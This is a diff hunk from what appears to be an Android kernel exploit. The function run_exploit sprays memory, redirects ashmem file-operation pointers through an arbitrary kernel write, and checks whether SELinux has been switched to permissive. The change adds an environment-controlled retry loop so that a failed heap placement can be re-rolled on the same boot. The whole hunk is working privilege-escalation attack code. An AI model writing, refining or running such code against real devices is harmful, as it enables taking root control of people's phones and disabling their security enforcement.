@@ -1288,7 +1288,33 @@ int run_exploit(int argc, char **argv) {
     }
     slab_drain();
     TIMER("pre-UMH drain");
-    do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
+    /*
+     * MODE4_RETRY: JC6 proved miss rolls can SURVIVE (errno22 = no swap,
+     * clean exit). Each retry = a fresh placement lottery on the SAME
+     * boot (new spray/leak/cycles/walk). Stop early on success
+     * (cfi_write_ret>0), a hard failure (walk-crash softboots anyway),
+     * or when SELinux already went permissive from a prior attempt.
+     */
+    {
+      int retries = env_int_range("MODE4_RETRY", 1, 1, 10);
+      for (int att = 1; att <= retries; att++) {
+        cfi_write_ret = -1;
+        cfi_last_step = -1;
+        cfi_dirty_seen = 0;
+        pr_info("MODE4_RETRY attempt %d/%d\n", att, retries);
+        do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
+        if (cfi_write_ret > 0 || check_selinux_off()) {
+          pr_success("MODE4_RETRY attempt %d WIN (wr=%zd)\n", att,
+                     cfi_write_ret);
+          break;
+        }
+        if (att < retries) {
+          pr_info("MODE4_RETRY miss (step=%d errno=%d) — re-rolling\n",
+                  cfi_last_step, cfi_last_errno);
+          usleep(200000);
+        }
+      }
+    }
     TIMER("fops redirect done");
     {
       char b[96];
